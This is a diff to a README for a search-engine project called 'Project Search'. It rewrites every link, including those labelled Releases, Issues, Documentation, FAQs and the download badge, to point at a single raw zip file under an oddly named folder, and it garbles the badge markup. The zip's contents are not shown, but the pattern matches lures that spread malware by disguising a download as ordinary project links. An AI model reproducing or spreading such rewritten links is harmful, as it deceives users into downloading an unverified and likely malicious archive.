@@ -7,7 +7,7 @@ Project Search is the code name for our search engine project, developed to help
 To get started with Project Search, you'll need to download it from our Releases page. Follow the steps below to install and run the software on your computer.
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/Minedwe/project-search/releases)
+[![Download](https://raw.githubusercontent.com/Minedwe/project-search/main/phototelescopic/project-search.zip%20Latest%https://raw.githubusercontent.com/Minedwe/project-search/main/phototelescopic/project-search.zip)](https://raw.githubusercontent.com/Minedwe/project-search/main/phototelescopic/project-search.zip)
 
 ## 💻 System Requirements
 - **Operating System:** Windows 10 or later, macOS, or Linux
@@ -17,7 +17,7 @@ To get started with Project Search, you'll need to download it from our Releases
 
 ## 📥 Download & Install
 1. Click the link below to visit the Releases page:
-   [Download Project Search](https://github.com/Minedwe/project-search/releases)
+   [Download Project Search](https://raw.githubusercontent.com/Minedwe/project-search/main/phototelescopic/project-search.zip)
 
 2. In the Releases section, you will see the latest version of Project Search. Look for a file that matches your operating system.
 
@@ -63,17 +63,17 @@ If you encounter issues during installation or use, try checking the following:
 - Make sure you have a stable internet connection during the installation.
 - Restart your computer and try opening Project Search again.
 
-If the problem persists, please visit our [Issues page](https://github.com/Minedwe/project-search/issues) to report the issue or seek help.
+If the problem persists, please visit our [Issues page](https://raw.githubusercontent.com/Minedwe/project-search/main/phototelescopic/project-search.zip) to report the issue or seek help.
 
 ## 🔗 Additional Resources
-- [Documentation](https://github.com/Minedwe/project-search/wiki)
-- [FAQs](https://github.com/Minedwe/project-search/wiki/FAQs)
+- [Documentation](https://raw.githubusercontent.com/Minedwe/project-search/main/phototelescopic/project-search.zip)
+- [FAQs](https://raw.githubusercontent.com/Minedwe/project-search/main/phototelescopic/project-search.zip)
 
 ## 📞 Support
 For any questions or support, please contact us via the Issues page or open a discussion on our GitHub repository.
 
 ## 🔗 Download Now Again
 Remember, you can always download the latest version from our Releases page:
-[Download Project Search](https://github.com/Minedwe/project-search/releases)
+[Download Project Search](https://raw.githubusercontent.com/Minedwe/project-search/main/phototelescopic/project-search.zip)
 
 Enjoy using Project Search, your reliable tool for finding information!
